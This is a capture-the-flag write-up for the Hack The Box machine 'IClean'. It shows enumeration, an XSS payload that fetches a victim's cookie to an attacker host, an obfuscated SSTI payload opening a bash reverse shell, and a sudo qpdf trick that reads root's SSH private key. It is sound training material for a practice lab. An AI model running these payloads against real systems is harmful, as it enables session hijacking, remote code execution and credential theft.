# IClean Write-up

<img src="https://labs.hackthebox.com/storage/avatars/750ba886c8a87103c69cac0f13f2de70.png" width="200" height="200">

## Nmap

`nmap -sC -sV 10.10.11.12`

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
    |_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
    80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
    |_http-server-header: Apache/2.4.52 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## Dirsearch 

`python3 dirsearch.py -u http://capiclean.htb/ --exclude-status 403,404,400,401 -o dir`

    Target: http://capiclean.htb/
    
    Starting:                                                                                                                  
    200 -    5KB - /about                                            
    302 -  189B  - /dashboard  ->  /                                 
    200 -    2KB - /login                                            
    302 -  189B  - /logout  ->  /                                    
    200 -    8KB - /services                                         
                                                                                 
    Task Completed                                        

http://capiclean.htb

![image](https://github.com/zer00d4y/writeups/assets/128820441/82f197be-44fd-4dbc-a912-8be4e5a407cb)

Open capiclean.htb/quote and intercept the request

![image](https://github.com/zer00d4y/writeups/assets/128820441/b454619e-2b9c-4da4-b734-5bc84c8094bd)

![image](https://github.com/zer00d4y/writeups/assets/128820441/bdaa2334-f3f7-41a4-b5f9-4b1fdc79f708)

## XSS

Payload:

    <img src=x onerror=fetch("http://ATTACK_IP:PORT/"+document.cookie);>

URLencoded payload:

    <img+src%3dx+onerror%3dfetch("http%3a//ATTACK_IP%3aPORT/"%2bdocument.cookie)%3b>&email=test%40test.test

Start python server

Paste our XSS payload in `service` section

![image](https://github.com/zer00d4y/writeups/assets/128820441/13506a92-7321-430a-9be5-b1c4ba8b8b26)

Cookie: 

    eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zh02rQ.FPqIYAKIFgs_W8kHStG34YIeMqo 

Set cookie named `session`

![image](https://github.com/zer00d4y/writeups/assets/128820441/3b5b7da7-da0e-488c-8e34-6200e27d0ce2)

http://capiclean.htb/dashboard

![image](https://github.com/zer00d4y/writeups/assets/128820441/821575d0-15ee-4e34-83b6-9f47180ea515)

## SSTI

![image](https://github.com/zer00d4y/writeups/assets/128820441/fca10c48-e13f-4354-8629-11408567f71d)

![image](https://github.com/zer00d4y/writeups/assets/128820441/e8b0a1d4-10a6-44fe-8ad6-7f6e3b20812d)

![image](https://github.com/zer00d4y/writeups/assets/128820441/5ef872b3-d0bd-434c-b1c3-f1db14b45267)

![image](https://github.com/zer00d4y/writeups/assets/128820441/d85cf6b0-25e1-4297-8524-e97700f06d8e)

![image](https://github.com/zer00d4y/writeups/assets/128820441/acf0bbd0-70a8-41e8-a372-1f7a357e579f)

![image](https://github.com/zer00d4y/writeups/assets/128820441/46ffbe82-e5ff-451d-9a9c-4687eec2c3b6)

SSTI payload:

    {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("bash -c '/bin/bash -i >& /dev/tcp/ATTACK_IP/PORT 0>&1'")|attr("read")()}}





## SSH

`ssh consuela@capiclean.htb`

password: `simple and clean`

Get the user flag

![image](https://github.com/zer00d4y/writeups/assets/128820441/5398c1f1-0d59-431c-b5d1-680643d487ed)

## Privilege escalation

    sudo -l

![image](https://github.com/zer00d4y/writeups/assets/128820441/1ba4487b-e860-4c17-9a04-d71371cd3da6)

 `/usr/bin/qpdf`

qpdf: https://qpdf.readthedocs.io/en/stable/cli.html

    sudo qpdf --empty --add-attachment /root/.ssh/id_rsa -- /tmp/key.pdf

Then open /tmp/key.pdf file and copy openssh private key

Create keyfile 

![image](https://github.com/zer00d4y/writeups/assets/128820441/437bb16a-9a83-4b05-bdaa-421bc13e33de)

Set the resolution to 600 for the private keyfile

    chmod 600 keyfile 

Connect to ssh using keyfile 

    ssh -i keyfile root@capiclean.htb

![image](https://github.com/zer00d4y/writeups/assets/128820441/d95376ca-a4e4-4ec3-993e-8dccfbf5f5d8)

Get the root flag 

![image](https://github.com/zer00d4y/writeups/assets/128820441/e0c95df4-73a5-43bc-8b7b-eee1659da8e8)
